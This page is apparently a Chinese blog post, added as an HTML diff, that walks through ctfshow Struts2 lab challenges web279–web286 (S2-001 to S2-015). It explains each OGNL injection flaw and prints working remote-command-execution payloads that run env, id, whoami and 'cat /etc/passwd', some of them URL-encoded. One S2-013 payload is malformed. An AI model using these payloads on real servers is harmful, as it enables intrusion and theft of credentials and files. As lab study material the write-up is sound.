@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web279-web300JavaStrut2篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/09/17 17:32:12</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p>
+</blockquote>
+<p>这里面的漏洞都是struts2漏洞，使用<br>建议下载Struts2scan工具辅助学习。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan.git">https://github.com/HatBoy/Struts2-Scan.git</a><br><a target="_blank" rel="noopener" href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p>
+</blockquote>
+<ul>
+<li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效</li>
+<li>通过网页后缀来判断，如.do .action，有可能不准<ul>
+<li>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的</li>
+<li>如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json</li>
+</ul>
+</li>
+<li>判断 &#x2F;struts&#x2F;webconsole.html 是否存在来进行判断，需要 devMode 为 true</li>
+</ul>
+<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p>
+</blockquote>
+<h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><pre class="language-bash" data-language="bash"><code class="language-bash">printenv | grep FLAG</code></pre>
+<p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690893342133-0c453427-6529-45f6-a84e-7a9b30b1cddc.png" alt="image.png">在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
+<p>所以，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a></p>
+<p>影响版本: 2.0.0 - 2.3.15<br>我们输入测试命令</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">%&#123;1+1&#125;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894169760-b882601b-4fc3-4cdf-a91d-3e7e81a3bb7f.png" alt="image.png"><br>提交之后发现加法表达式被成功执行了。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894216166-7493cfb3-b16a-4c94-aedf-76293e9ca03d.png" alt="image.png"></p>
+<ul>
+<li>%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li>
+<li>#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li>
+<li>$主要是在Struts 2配置文件中，引用OGNL表达式</li>
+</ul>
+<p>常用payload：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;&#x2F; 获取tomcat路径
+%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;
+
+&#x2F;&#x2F; 获取web路径
+%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;
+
+&#x2F;&#x2F; 命令执行 env，flag就在其中
+password&#x3D;%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username&#x3D;1</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894841073-47f7327b-4cdc-46d9-9821-109faa25e90e.png" alt="image.png"><br>url转义一下。<br>这个用struts2scan工具扫描，但是无法检测出漏洞，这里不清楚为什么。<br>ctfshow这个靶场的用不了，但是vulhub自己搭就可以。但是两个都无法进行漏洞利用（进入命令行模式）<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690898715564-49bc97ef-53b3-4a51-a792-d439165e1f2f.png" alt="image.png"><br>这里换了一个工具，但是也是不能用001，但是可以执行016了。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p>
+</blockquote>
+<h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果<br>影响版本：Struts 2.0.0 - Struts 2.0.11.2<br>poc：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ifconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))
+</code></pre>
+<p>他给的这个poc也不太能用<br>这里直接用工具了：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900144282-73dea694-41b3-47e5-aff2-63823b79a439.png" alt="image.png"><br>那个struts2scan是真不好用啊。各种误判。</p>
+<h1 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h1><h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3<br>poc：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;printenv | grep FLAG&#39;).getInputStream())) + &#39;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900949819-59a428bb-9741-40bb-85c4-9e8396a2b2e5.png" alt="image.png"></p>
+<h1 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h1><h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的<br>影响版本：Struts 2.1.0 - Struts 2.3.1</p>
+<h2 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Cookie:(&#39;#_memberAccess.setAllowStaticMethodAccess(true)&#39;)(1)(2)&#x3D;Aluvion; (&#39;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#39;)(1)(2)&#x3D;Twings;</code></pre>
+<p>没成功</p>
+<h2 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h2><pre class="language-bash" data-language="bash"><code class="language-bash">devmode.action?debug&#x3D;command&amp;expression&#x3D;(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27printenv%20%7C%20grep%20FLAG%27%29.getInputStream%28%29%29)</code></pre>
+<p>这个可以<br>当然也可以用S2-016直接梭</p>
+<h1 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h1><h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><p>这个漏洞再次来源于s2-003、s2-005<br>参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中<br>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线<br>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用&#x2F;helloword.acton?example&#x3D;<OGNL statement>&amp;(example)(‘xxx’)&#x3D;1的方法来执行它，从而绕过官方对#、\等特殊字符的防御<br>通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行<br>影响版本：Struts 2.0.0 - Struts 2.3.1<br><code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器<br>payload：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;ajax&#x2F;example5.action?age&#x3D;12313&amp;name&#x3D;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]&#x3D;+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]&#x3D;true,+%23a&#x3D;@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b&#x3D;new+java.io.InputStreamReader(%23a),%23c&#x3D;new+java.io.BufferedReader(%23b),%23d&#x3D;new+char[51020],%23c.read(%23d),%23kxlzx&#x3D;@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901618232-92eccea1-a51d-4e57-96c1-d97ab91b2662.png" alt="image.png"><br>可以直接下载得到一个文件：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901903963-8d9c0690-3830-4867-9793-2a5190a1ed1a.png" alt="image.png"></p>
+<h1 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h1><h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">&lt;package name&#x3D;&quot;S2-012&quot; extends&#x3D;&quot;struts-default&quot;&gt;
+  &lt;action name&#x3D;&quot;user&quot; class&#x3D;&quot;com.demo.action.UserAction&quot;&gt;
+    &lt;result name&#x3D;&quot;redirect&quot; type&#x3D;&quot;redirect&quot;&gt;&#x2F;index.jsp?name&#x3D;$&#123;name&#125;&lt;&#x2F;result&gt;
+    &lt;result name&#x3D;&quot;input&quot;&gt;&#x2F;index.jsp&lt;&#x2F;result&gt;
+    &lt;result name&#x3D;&quot;success&quot;&gt;&#x2F;index.jsp&lt;&#x2F;result&gt;
+  &lt;&#x2F;action&gt;
+&lt;&#x2F;package&gt;</code></pre>
+<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13<br>payload:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre>
+<p>将payload放入输入框中提交，就可以下载到文本内容。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536585259-0819a898-28ff-441e-b5e4-403757ed8f6d.png" alt="image.png"><br>flag在环境里面，直接查看即可：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536905535-1f302ae2-41aa-44af-8576-00ccfff0fd02.png" alt="image.png"></p>
+<h1 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h1><h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
+<ul>
+<li>none - 链接不包含请求的任意参数值（默认）</li>
+<li>get - 链接只包含 GET 请求中的参数和其值</li>
+<li>all - 链接包含 GET 和 POST 所有参数和其值</li>
+</ul>
+<p>&lt;s:a&gt;用来显示一个超链接，当includeParams&#x3D;all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞<br>影响版本：2.0.0 - 2.3.14.1<br>poc：</p>
+<pre class="language-java" data-language="java"><code class="language-java">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[50000],#c.read(#d),#out&#x3D;@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;
+
+&#x2F;&#x2F; 或
+
+$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())&#125;</code></pre>
+<p>看看payload：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">link.action?a&#x3D;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%dddddddd3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%dd7D</code></pre>
+<p>（似乎第二个用不了，测试得不到rce）</p>
+<h1 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h1><h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">&lt;package name&#x3D;&quot;S2-015&quot; extends&#x3D;&quot;struts-default&quot;&gt;
+    &lt;action name&#x3D;&quot;*&quot; class&#x3D;&quot;com.demo.action.PageAction&quot;&gt;
+        &lt;result&gt;&#x2F;&#123;1&#125;.jsp&lt;&#x2F;result&gt;
+    &lt;&#x2F;action&gt;
+&lt;&#x2F;package&gt;</code></pre>
+<p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功<br>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]&#x3D;true 来修改其值达到重获静态方法调用的能力<br>影响版本: 2.0.0 - 2.3.14.2<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692537740735-e067567e-b70b-414e-9435-4415d6015bfc.png" alt="image.png"><br>poc:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]&#x3D;false,#m&#x3D;#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q&#125;.action</code></pre>
+<p>payload:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%65%6e%76%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</code></pre>
+<p>全部url编码。</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">printenv | grep FLAG</code></pre>
